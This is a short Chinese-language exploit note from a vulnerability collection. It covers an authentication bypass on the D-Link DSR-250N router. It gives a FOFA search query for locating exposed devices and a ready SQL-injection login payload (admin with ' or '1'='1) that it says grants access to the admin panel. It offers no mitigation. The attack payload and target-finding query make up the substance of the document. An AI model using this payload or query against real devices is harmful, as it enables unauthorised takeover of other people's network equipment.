---
title: D-Link DSR-250N 万能密码漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - 网络设备漏洞
 - D-Link
---

# D-Link DSR-250N 万能密码漏洞

## 漏洞描述

D-Link DSR-250N 存在万能密码漏洞，攻击者通过漏洞可以获取后台权限

## 漏洞影响

> [!NOTE]
>
> D-Link DSR-250N

## FOFA

> [!NOTE]
>
> app="D_Link-DSR-250N"

## 漏洞复现

登录页面如下

![image-20210609175053339](/img/20210924020246176647.png)

```
user: admin
pass: ' or '1'='1
```

成功登录后台

![image-20210609175150907](/img/20210924020246418018.png)